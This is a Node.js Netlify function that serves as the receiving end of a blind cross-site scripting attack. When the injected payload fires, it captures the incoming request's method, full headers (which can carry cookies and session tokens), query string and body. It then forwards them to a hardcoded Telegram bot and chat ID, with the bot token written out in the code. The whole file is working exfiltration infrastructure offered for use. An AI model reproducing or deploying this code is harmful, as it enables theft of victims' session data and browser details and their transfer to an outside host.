const fetch = require("node-fetch");

// Telegram bot credentials
const BOT_TOKEN = "7862728855:AAE2TMnjjXyfM_dsWsv6i44linILhvZgQlA/SendMessage";
const CHAT_ID = "946787813";

// Function to send message to Telegram
async function sendToTelegram(message) {
  const url = `https://api.telegram.org/bot7862728855:AAE2TMnjjXyfM_dsWsv6i44linILhvZgQlA/SendMessage`;
  const response = await fetch(url, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: message,
    }),
  });
  return response.ok;
}

// Netlify function handler
exports.handler = async (event) => {
  const method = event.httpMethod;
  const headers = JSON.stringify(event.headers);
  const queryString = JSON.stringify(event.queryStringParameters);
  const body = event.body || "No body";

  const message = `Blind XSS Triggered!\n\nMethod: ${method}\nHeaders: ${headers}\nQuery: ${queryString}\nBody: ${body}`;
  console.log(message);

  // Send to Telegram
  await sendToTelegram(message);

  return {
    statusCode: 200,
    body: "Request captured and sent to Telegram.",
  };
};
